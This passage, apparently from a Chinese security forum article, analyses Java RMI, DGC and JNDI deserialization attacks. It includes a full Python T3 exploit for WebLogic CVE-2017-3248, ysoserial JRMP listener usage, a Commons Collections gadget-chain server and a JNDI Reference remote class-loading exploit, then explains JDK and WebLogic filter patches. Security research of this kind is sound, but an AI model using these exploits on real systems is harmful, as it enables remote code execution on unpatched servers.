跟进里面：如下图，可以看到之后跟进几步我们能看到，这里会创建一个DGCClient,并且初始化其内部类EndpointEntry的时候使用的远程地址就是传入的stub对象里面的骨根的远程地址（UnicastRef对象里面）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-64aee8c4e3bc2b4a603a0a27fb466dcca8bfc089.png)

接着向对应远程地址发送一个DGC 的dirty操作：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-fa409f9e424ab3a7e033d0ff181a5917fa7eaa02.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5bec9ac646a46d675d58c18b35a6f9043d78acf7.png)

进入dirty函数，如下60行处调用newCall()创建连接：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d014264d58a13da29879a91d023443d81b97e0ca.png)

上图，接着在65行获取到连接的写出流，发送三个序列化对象过去，分别是对象ID和一个hash值，一个Lease对象。

接着，我们看下Server端怎么处理的这些序列化对象的：

如下是Server端的调用栈：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-239835313643019307035e766f9fcf52fbfc9ca9.png)

我们来到StreamRemoteCall：如下，server的骨根收到发送的序列化对象之后，

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-562d6f191b84e4bb1fe14f4826e3548c2d01a29c.png)

接着往下，可以看到这里case 2，拿到了流之后，对序列化内容的反序列化操作，这里我们可以看到也没有做任何的安全检查，直接反序列化Registry发送过来的DGC对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-917b659d6ffbb6b5f880fcd563319dfc4737e54f.png)

#### 攻击构造

这里我们需要构造一个jrmp的DGC server其实就是一个监听（因为dgc通信只要符合jrmp即可），绑定一个存在反序列化调用链的恶意对象，然后rmi的Server端发送一个stub对象给Registry，这个stub我们要格外构造下将其中的UnicastRef里面的远程地址位位我们构造的jrmp DGC server的地址，这样根据我们上面分析的逻辑，Registry收到这个stub存根之后会发送一个DGC 的dirty操作给我们构造好的JRMP DGC server，JRMP DGC server返回我们构造好的恶意对象，Registry收到这个对象之后反序列化从而触发代码执行或者命令执行。

其中起一个jrmp DGC server 可以直接使用ysoserial里面的jrmp listern：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4fc1e0974742acc2522f3415875a01e78e88eead.png)

如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-705e4af620b9b4d86a40122f76415773300ac1cc.png)

这里我们不再自己构造环境来模拟攻击，拿一个漏洞来说，weblogic 的CVE-2017-3248 反序列化漏洞，原理就是这个一模一样。

#### CVE-2017-3248

这里环境搭建直接使用 p神的vulhub项目里面的《Weblogic &lt; 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）》即可，具体环境搭建参考：

`https://vulhub.org/#/environments/weblogic/CVE-2017-10271/`

**复现:**

windows ：192.168.129.1

linux：192.168.129.142（172.28.0.1）

docker：（在linux上搭建的）：172.28.0.2

复现利用过程步骤：

- 1、利用ysoserial，在linux上搭建jrmp服务器，用于监听dgc层面的请求，并返回cc反序列化payload
- 2、在windows上构造特殊封装的UnicastRef对象的序列化数据，使用t3协议发送至受害主机
- 3、受害主机接受到特殊封装的UnnicastRef对象的序列化数据，反序列化时在dgc中触发jrmp请求，请求之前搭建好的jrmp服务器
- 4、搭建好的jrmp服务器响应cc反序列化payload
- 5、受害主机接受到到cc反序列化payload之后，在dgc层面反序列化，从而绕过之前补丁的过滤处，触发反序列化漏洞

上面提到的特殊封装的形式,并且最终是生成一个实现了Proxy对象，这个Proxy对象是的接口是Registry，其传入的实现了InvocationHandler接口的类为RemoteObjectInvocationHandler类实例对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-84ee04cfacdb8f3363be1d30c93effca3741e820.png)

**根据上面提到的5步开展复现：**

首先我们先借助ysoserial在linux上部署jrmp服务器（注意这里有一个坑点，因为我们复现的环境是在docker中，所以我们这个jrmp服务器得再docker容器所在的机器上部署，这样才能保住之后正常回连以及发送payload）

ysoserial下载地址：<https://github.com/frohoff/ysoserial/>

再linux中的7777端口部署jrmp服务器，并规定其利用的payload为cc1执行的命令是 touch /tmp/ga0weIs

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-dd3f606ff0678667d8cbf87256ff81ecc1e5cdae.png)

然后在windows中利用下面这个exploit攻击脚本构造T3协议并发送特殊封装的UnicastRef对象的序列化数据（这里我们使用的是Ysoserial里面JRMPClient，JRMPClient里面其实就是构造了一个满足要求封装的UnicastRef对象\[Registry对象\]，发送到目的端口）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ba19d94a271d90438b69bb1d073671079375c36f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c6ab91e99158f23d09073a6338278a46e8375ee9.png)

exploit 构造t3协议以及发送:

```php
from \_\_future\_\_ import print\_function  
​  
import binascii  
import os  
import socket  
import sys  
import time  
​  
​  
def generate\_payload(path\_ysoserial, jrmp\_listener\_ip, jrmp\_listener\_port, jrmp\_client):  
    #generates ysoserial payload  
    command = 'java -jar {} {} {}:{} > payload.out'.format(path\_ysoserial, jrmp\_client, jrmp\_listener\_ip, jrmp\_listener\_port)  
    print("command: " + command)  
    os.system(command)  
    bin\_file = open('payload.out','rb').read()  
    return binascii.hexlify(bin\_file)  
​  
​  
def t3\_handshake(sock, server\_addr):  
    sock.connect(server\_addr)  
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))  
    time.sleep(1)  
    sock.recv(1024)  
    print('handshake successful')  
​  
​  
def build\_t3\_request\_object(sock, port):  
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'  
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))  
    data3 = '1a7727000d3234322e323134'  
    data4 = '2e312e32353461863d1d0000000078'  
    for d in \[data1,data2,data3,data4\]:  
        sock.send(d.decode('hex'))  
    time.sleep(2)  
    print('send request payload successful,recv length:%d'%(len(sock.recv(2048))))  
​  
​  
def send\_payload\_objdata(sock, data):  
    payload\='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'  
    payload+=data  
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'  
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)  
    sock.send(payload.decode('hex'))  
    time.sleep(2)  
    sock.send(payload.decode('hex'))  
    res = ''  
    try:  
        while True:  
            res += sock.recv(4096)  
            time.sleep(0.1)  
    except Exception:  
        pass  
    return res  
​  
​  
def exploit(dip, dport, path\_ysoserial, jrmp\_listener\_ip, jrmp\_listener\_port, jrmp\_client):  
    sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)  
    sock.settimeout(65)  
    server\_addr = (dip, dport)  
    t3\_handshake(sock, server\_addr)  
    build\_t3\_request\_object(sock, dport)  
    payload = generate\_payload(path\_ysoserial, jrmp\_listener\_ip, jrmp\_listener\_port, jrmp\_client)  
    print("payload: " + payload)  
    rs\=send\_payload\_objdata(sock, payload)  
    print('response: ' + rs)  
    print('exploit completed!')  
​  
​  
if \_\_name\_\_\=="\_\_main\_\_":  
    #check for args, print usage if incorrect  
    if len(sys.argv) !\= 7:  
        print('\\nUsage:\\nexploit.py \[victim ip\] \[victim port\] \[path to ysoserial\] '  
              '\[JRMPListener ip\] \[JRMPListener port\] \[JRMPClient\]\\n')  
        sys.exit()  
​  
    dip = sys.argv\[1\]  
    dport = int(sys.argv\[2\])  
    path\_ysoserial = sys.argv\[3\]  
    jrmp\_listener\_ip = sys.argv\[4\]  
    jrmp\_listener\_port = sys.argv\[5\]  
    jrmp\_client = sys.argv\[6\]  
    exploit(dip, dport, path\_ysoserial, jrmp\_listener\_ip, jrmp\_listener\_port, jrmp\_client)  

```

然后就是受害在dgc中触发jrmp请求之前部署好的服务器，返回的序列化数据为恶意payload，在dgc层面反序列化从而导致反序列化漏洞

下图为在linux上部署的jrmp服务器接收到来自受害终端来组DGC层面的jrmp请求记录：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-65f7a376de66a132bebbb12851649daac2be7e9b.png)

最后我们去受害环境里面看下对应的命令是否执行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f856100fcc49e2e5c808171a1816a4c196dbad53.png)

可以看到命令执行成功。

### 3）、对远程调用过程中传输的参数或返回对象操作实现攻击利用

Rgeistry+Server代码(这里笔者直接在ysoserial 项目里面建的，所以构造payload的时候直接调用ysoserial方法函数)：将远程方法test()调用返回的对象设置为cc2的构造的优先队列对象。

```php
package ysoserial.payloads.util;  
​  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class RmiRegistry {  
    public static void main(String\[\] args) throws Exception{  
        Registry registry \= LocateRegistry.createRegistry(9999);  
        // （server）绑定对象到注册中心，并给他取名为hello  
        EvalClass evalClass \= new EvalClassImp();  
        registry.bind("eval",evalClass);  
        System.out.println("open port for rmi for 9999:hellos");  
    }  
}  
​  
​  
package ysoserial.payloads.util;  
​  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
​  
public interface EvalClass extends Remote {  
        Object test() throws RemoteException;  
​  
}  
​  
​  
package ysoserial.payloads.util;  
​  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
​  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.PriorityQueue;  
​  
public class EvalClassImp extends UnicastRemoteObject implements EvalClass {  
    public EvalClassImp() throws RemoteException {  
        super();  
    }  
​  
    @Override  
    public Object test() throws RemoteException {  
        try {  
            final Object templates \= Gadgets.createTemplatesImpl("calc");  
            // mock method name until armed  
            final InvokerTransformer transformer \= new InvokerTransformer("toString", new Class\[0\], new Object\[0\]);  
​  
            // create queue with numbers and basic comparator  
            final PriorityQueue<Object\> queue \= new PriorityQueue<Object\>(2,new TransformingComparator(transformer));  
            // stub data for replacement later  
            queue.add(1);  
            queue.add(1);  
​  
            // switch method called by comparator  
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");  
​  
            // switch contents of queue  
            final Object\[\] queueArray \= (Object\[\]) Reflections.getFieldValue(queue, "queue");  
            queueArray\[0\] \= templates;  
            queueArray\[1\] \= 1;  
​  
            return queue;  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
        return 0;  
    }  
}  
​
```

client代码：

```php
import ysoserial.payloads.util.EvalClass;  

import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  

public class RmiClient {  
    public static void main(String\[\] args) {  
        try {  

            Registry registry = LocateRegistry.getRegistry("localhost", 9999);  
            EvalClass evalClass = (EvalClass) registry.lookup("eval");  
            System.out.println(evalClass.test());  
        } catch (RemoteException e) {  
            e.printStackTrace();  
        } catch (NotBoundException e) {  
            e.printStackTrace();  
        }  

    }  
}  

package ysoserial.payloads.util;  

import java.rmi.RemoteException;  

public interface EvalClass {  
    Object test() throws RemoteException;  
}  
```

先运行 server+registry代码，然后运行client：如下，成功触发调用链执行命令：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1e8161ab175225dc2ba7bfc00389e5d1f0b218cb.png)

这里有一个小细节，client项目里面要有cc2的依赖才行。（org.apache.commons.collections4）

同时这里有一个问题，可以发现上述情况，受害是发起请求的客户端，服务端我们构造了一个类其一个远程方法中返回一个恶意对象，客户端要对其远程方法进行调用从而触发漏洞，而且客户端同时要存在对应构造的类的接口类定义，所以实际场景中这种情况很难利用。

主要的攻击原理就是上面这三个，将这个三个原理运用到上文我们提到的通信流程里面，即可完成client 、server 、 Registry之间的相互攻击。

0x03 JNDI
=========

上面攻击场景分析清楚之后，会发现为啥根本没有提到JNDI，那为什么java反序列化大家只要一提起rmi就会想到jndi呢，这里我们来看下结合JNDI和rmi反序列化实现的攻击思路

一、原理：
-----

开始我们了解到jndi全称叫java name and Directory interface，而java中常见的命名和目录服务就有rmi的形式。

所以当我们使用jndi客户端的lookup方法的时候，如果参数是可控，那么就会请求到我们构造的rmi上面，返回一个我们可控的对象。而JNDI的客户端对这个对象处理的时候触发了一些危险的行为，导致客户端失陷。利用这个原理的漏洞常见的有：log4j2、weblogic中的CVE-2018-3191。

这个rmi结合JNDI出现的漏洞，原理和我们上文提到的“对远程调用过程中传输的参数或返回对象操作实现的攻击利用”场景是类似的原理就，这里JNDI客户端虽然不是直接反序列化回传对象触发的漏洞，但是差不多，其在对rmiserver的返回对象（下文的Reference对象）进行操作的时候触发的调用链。

这里我们选择的对象是Reference对象，jndi客户端lookup方法里面对从rmi server获取的到的reference对象的时候会去加载里面的className参数对应的对象，当加载不到的时候，会从urlclassloader加载，加载的地址是factoryLocation参数，这里我们构造一个恶意类的绑定到对应地址，恶意类的构造方法或者初始化方法里面实现一些恶意代码，即可；客户端会对这个恶意类进行加载和创建实例。

二、代码实现
------

这里的代码实现是：

Server和Registry放到一起：

```php
​  
package rmi;  
​  
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.HashedMap;  
import org.apache.commons.collections.map.LazyMap;  
import sun.rmi.transport.StreamRemoteCall;  
​  
import javax.naming.Reference;  
​  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
​  
public class RmiServer {  
    public static void main(String\[\] args)throws Exception {  
        try {  
            //获取远程注册中心  
            Registry registry \=LocateRegistry.createRegistry(9999);  
            Reference reference \= new Reference("Calc","Calc","http://127.0.0.1:8001/");  
            ReferenceWrapper referenceWrapper \= new ReferenceWrapper(reference);  
            registry.bind("Calc",referenceWrapper);  
            System.out.println("open port for rmi for 9999:Calc");  
​  
        } catch (RemoteException | AlreadyBoundException e) {  
            e.printStackTrace();  
        }  
    }  
​  
​  
​  
​  
}  
​
```

Client：

```php
import javax.naming.InitialContext;  
import javax.naming.NamingException;  
​  
public class JndiClient {  
    public static void main(String\[\] args) throws NamingException {  
        new InitialContext().lookup("rmi://127.0.0.1:9999/Calc");  
    }  
​  
}  
​
```

恶意类：

Calc，这里我们直接使用python 起http服务绑定Calc.class：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9297f0d9b09d807e98b905f9be1bce4c9950e271.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-960b01e4c3309864a09a367d3dcab22fe7c89f63.png)

```php
import java.io.IOException;  

public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
}  
```

先运行server，然后运行JNDIClient，如下图成功执行命令：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bb2a403eac6eca429d6223f75cc1bbe073b11d09.png)

这里我们简单看下流量：

三、流量分析：
-------

第一部分流量，客户端向 rmi Registry查询Calc对象，rmi Registry返回一个ReferenceWrapper对象的存根：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-99254fa28eae290d269f832c855f5e0fe611f5a2.png)

下图中的3809转成十进制为14345端口，所以骨根再14345端口上。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c07a13366f3ac5ee0c24e31caec5e0195c9fb53e.png)

第二部分流量，客户端向 骨根对象的发起请求：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7862903298d6a3c9c80b8414fd7f7126ad06cc74.png)

如下图，最终客户端最终获取到了一个Reference对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-27e3a0f9ebc85ea5af7f39bee8f8b8989fffe689.png)

第三部分流量：JNDI客户端尝试解析Reference对象的时候，触发远程加载恶意类的流量(远程地址是reference对象里面的factoryLocation)：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b5522fe3474ef6abb366bb7fe8c8da8ab81faa6b.png)

四、代码分析
------

接下来我们来看看JNDI客户端里面怎么触发的加载类:

整个的调用链如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-05c303d0c558bced8bb0b203d5a519a7ae9f778d.png)

简单分析下，在JNDI客户端中我们调用InitalContext类lookup方法查找rmi对象，跟进到GenericURLContext的lookup方法里面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-14600a7ec1aeb074245b1204965d20fdda39d3e5.png)

上图中很清楚看出，当传入的rmi形式的参数的时候，最终是调用RegistryContext的lookup来实现的，继续跟进，如下图，可以看到在RegistryContext里面的lookup中会调用registry.lookup方法从而获取到我们构造的ReferenceWrapper对象，然后调用this.decodeObject来处理该对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-69e9d4a53e739b4444af36354445eef06a450d49.png)

跟进decodeObject方法的实现，如下图，里面对传入的对象类型进行了判断，如果是一个Reference对象，就调用NamingManager.getObjectInstance()的方式来获取到相关对象的实例，不妨想一下这里是想获取到什么对象的实例呢？

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0f3f7cc8e8af4b5bc4db17dfe195fd454bfb8660.png)

跟进NamingManager.getObjectInstance的实现：如下图，粗略读下代码其实是可以看出这个方法就是想要从我们传入的Reference对象中获取到一个ObjectFactory对象，其在304行到338行，就是判断当reference对象存在的时候尝试从refenence还原出对应的ObjectFactory对象。可以看到在319行的时候调用getObjectFactoryFormReference方法获取到factory对象。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-74d0ed91b5e932537e264593b39f7afd8458c1a9.png)

接下来，继续跟进getObjectFactoryFromReference()的实现：如下图，这个方法里面其实就是三部分，第一部分就是尝试使用本地的加载器来加载，其实就是Appclassloader，很明显本地肯定加载不到factoryName，因为这个factoryName是我们构造Reference对象的时候传入的恶意类的类名，即EvalClass2。第二部分则是判断对应的reference对象里面有没有传入codebase即（factoryLocation 参数），如果传入了就调用helper.loadClass(name,codebase)来实现。第三部分就是获取到对应类之后调用newInstance获取类的实例。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3c454b7ae36557195478e33c0a0e3a6d18371468.png)

这里我们详细看看，第二部分中的helper.loadClass(name,codebase)怎么实现的：如下图，这里新创建了一个URLClassloader去加载className

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4890b9e0f11aa2157f01449874b11f0708159d9b.png)

继续跟进调用的loadClass方法：如下图，其实就是直接Class.forName并传入了true，所以这里会做初始化，如果我们在恶意类里面的相关命令执行的代码写到的是初始化模块里面，则在这里就会触发了，如果是在构造方法里面写的相关命令执行的代码则是在newInstance里面触发。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d35f3cf1548d44b266d026b2fab7c11d1678f3b8.png)

0x04 JDK版本以及补丁相关
================

上文所有的场景，均使用的是jdk8\_031，这一低版本的JDK；

接下来我们来分析下上文提到的三种场景中jdk对其的影响；

下文的实验环境都换成jdk8\_151：

一、对（如Server端bind操作）发送的存根对象操作的实现的攻击利用
------------------------------------

这里我们使用上面相同的代码，然后将jdk调整为jdk8\_151测试：

Regietry:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-fccbb168dddaf5f47729a7625c0e42bb10795b61.png)

Server端执行bind:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-af84f237a0829429becb145633a26d203a12f6dd.png)

运行之后Registry报错如下：可以看到这里报错意思是对象过滤流拒绝了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bcf4b49f62a95b0ad7d638193ca35fa12dd73ad1.png)

这里我们去看看这个ObjectInputFilter类，其实就是可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器

如下可以看到其实就是一个接口类，主要方法就是checkInput

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-bd9ab619a9fd2882f1e3082ec3927d864a8eef1d.png)

并且这个jdk版本下我们去看ObjectInputStream的时候会发现，其静态初始化代码里面出现了一个set该接口类的实例情况：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a9d040e87453939b94327f5ef0cbcba60c5682a4.png)

而对应到我们这个场景，设置的实现了ObjectInputFilter接口的类从RegistryImp中拿到的:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ba0108ccaaf58ca65ac7def0382959e9c145325f.png)  
如下栈中我们可以看到，是设置filter：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-72d343cc14141ccc026cb09820af3d67735a6071.png)

然后反序列化的时候会使用这个filter对其进行过滤：

如下栈：当ObjectInputStream的readObject里面调用checkInput（）的时候

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e9d1894b6d1b5df137be09829596d0dbd628dfd0.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b1df095fbfabffb8e67d38e88b27765405d7e759.png)

最后就是来到了RegistryImp的regisrtyFilter()方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-dbc2de9af77f88f64bc241e631f0f9f0dbafaf19.png)

我们来看这个方法：

```php
    private static Status registryFilter(FilterInfo var0) {  
        if (registryFilter != null) {  
            Status var1 \= registryFilter.checkInput(var0);  
            if (var1 != Status.UNDECIDED) {  
                return var1;  
            }  
        }  
​  
        if (var0.depth() \> 20L) {  
            return Status.REJECTED;  
        } else {  
            Class var2 \= var0.serialClass();  
            if (var2 \== null) {  
                return Status.UNDECIDED;  
            } else {  
                if (var2.isArray()) {  
                    if (var0.arrayLength() \>= 0L && var0.arrayLength() \> 10000L) {  
                        return Status.REJECTED;  
                    }  
​  
                    do {  
                        var2 \= var2.getComponentType();  
                    } while(var2.isArray());  
                }  
​  
                if (var2.isPrimitive()) {  
                    return Status.ALLOWED;  
                } else {  
                    return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;  
                }  
            }  
        }  
    }
```

这里最后几行的可以看到存在一个白名单判断机制，只有符合`String\Number\Remote\Proxy\UnicaseRef\RMIClientSocketFactory\RMIServerSocketFactory\Actibation\UID`的类才能通过，所以我们构造的对象里面的AnnotationInvovationHande类以及后面优先队列等都被过滤，最后被拒绝。

上述改变是在jdk 8\_121 开始的，就是rmi中远程发送的序列化存根对象必须是以上白名单里面的。

这里我们简单来看下白名单里面的几个类会发现像UnicaseRef UID 这种其实就是为了能让上文我们提到的正常bind方法里面传输的序列化对象能够被顺利反序列化！其中UnicaseRef里面是记载了骨根所在位置的信息。

二、对jrmp中dgc操作实现的攻击利用
--------------------

这个情况下的攻击利用，上文是通过weblogic的漏洞cve-2017-3248来讲的，所以这里我们直接去看下对应漏洞的补丁即可：

这个cve-2017-3248的原理是，发送一个java.rmi.registry.Registry代理对象序列化内容过去，这个动态代理对象里面的InvocationHandler是一个RemoteObjectInvocationHandler，其里面封装了一个我们构造好的UnicaseRef对象（其实就是指向恶意的jrmp 监听的地址上），服务器收到这个请求之后，会调用dgc请求，发一个dirty去骨根处”租借“，此时就请求到我们设置的jrmp 的监听，本来是要返回一个lease对象，这个对象里面是对租期的相关描述；但是这里我们设置的监听返回的是一个恶意对象（如cc2中构造好的优先队列、或者cc1里面的被代理的Lazymap对象），服务器接收到之后就会反序列化从而触发调用链。

如下是weblogic对cve-2017-3248漏洞的修复：

这里涉及到了weblogic里面的很多内容，笔者之前曾对weblogic全系列反序列化复现调试过才知道，但是文章篇幅有限所以这里我们简单的说以下，通俗一点说就是：weblogic对其处理输入流的对象进行了修改（其实就是这个类：weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class），在这个类里面重写JDK中ObjectInputStream里面的resolveProxyClass方法，在这个方法里面将Registry这个类加入了黑名单；从而使Registry在这个通信过程中传输会反序列化失败。

如下是这个方法的实现：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8257a66b7d16739334530cb7062cc32d0f8bebbe.png)

这里我们简单讲下为什么上述场景中重写JDK中ObjectInputStream里面的resolveProxyClass方法就能切断反序列化，如下是笔者总结ObjectInputStream的readObject的调用过程：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-73071097b7dada56c02c7bdeea8aaadf9880bde3.png)

如上图我们可以看到当存在代理类的情况的时候反序列化的时候，去获取相关类名的时候，是要通过resolveProxyClass来实现的；所以weblogic 通过重写了这个resolveProxyClass就可以自定义其实现，对相关类进行过滤，并且如下图我们也可以看到其就是添加了个黑名单过滤，然后又是调用父类ObjectInputStream的resolveProxyClass:

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-86b22b92adfdf6cf730e5ab101b5241e6b69363b.png)

当然这个修复后续又被各种绕过，从而有了一系列的weblogic反序列化漏洞，如CVE-2018-2628、CVE-2018-2893、CVE-2018-3245等都是对这个黑名单的绕过。

三、对远程调用过程中传输的参数或返回对象进行操作实现的攻击利用
-------------------------------

这个场景我们主要拿JNDI 客户端请求rmi Server的场景来分析，因为上文我们也提到原始场景下很难被使用在真实攻击场景里面；

首先回顾下上文提到的jndi客户端和rmi使用导致的远程任意类加载的漏洞：

